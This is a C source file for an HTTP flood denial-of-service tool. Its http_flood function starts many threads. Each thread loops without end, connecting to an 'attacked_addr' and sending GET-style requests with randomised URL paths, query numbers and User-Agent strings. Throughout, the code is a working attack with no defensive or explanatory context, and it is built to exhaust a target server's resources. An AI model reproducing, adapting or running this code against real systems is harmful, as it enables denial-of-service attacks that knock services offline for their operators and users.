#include "http_flood.h"

char* generate_url_path() {
    time_t t;
    static int i = 0;
    srand((unsigned)time(&t) + (i++));
    char lowerletter[27];
    char upperletter[27];
    char number[11];
    char ascii[64] = {0};

    for (int i=0; i<27; ++i) {
        lowerletter[i] = (i != 26) ? (i + 97) : '\0';
        upperletter[i] = (i != 26) ? (i + 65) : '\0';
        if (i < 11) {
            number[i] = (i != 10) ? (i + 48) : '\0';
        }
    }
    
    strcat(ascii, lowerletter);
    strcat(ascii, upperletter);
    strcat(ascii, number);

    char* url = (char*)malloc(sizeof(char)*6);

    for (int i=0; i<6; ++i) {
        url[i] = (i != 5) ? (ascii[rand()%62]) : '\0';
    }

    printf("%s\n", url);

    return url;
}

void http_build(void *arg_ipinfo) {
    time_t t;
    srand((unsigned)time(&t));
    IPinfo *ipinfo = (IPinfo *)arg_ipinfo;

    while (1) {
        struct sockaddr_in server_addr;
        char* request = (char*)malloc(sizeof(char)*1024);
        char* URL_PATH = generate_url_path();
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);

        memset(&server_addr, '0', sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(PORT);
        server_addr.sin_addr.s_addr = ipinfo->attacked_addr;

        connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
        sprintf(request, "%s /%s?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept-language: en-US,en,q=0.5\r\n\r\n", METHOD, URL_PATH, rand()%500000, "192.168.0.210", USER_AGENT[rand()%20]);
        send(sockfd, request, strlen(request), 0);

        free(request);
        free(URL_PATH);
        close(sockfd);
    }
    pthread_exit(0);

    return;
}

int http_flood(IPinfo ipinfo, int MAX_THREADS) {
    pthread_t thread_id[MAX_THREADS];

    for(int i = 0; i < MAX_THREADS; i++) {
        ipinfo.thread_id = i;
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_create(&thread_id[i], &attr, (void*)http_build, (void*)&ipinfo);
        sleep(1);
    }

    for(int i = 0; i < MAX_THREADS; i++) {
        pthread_join(thread_id[i], NULL);
    }

    return 0;
}
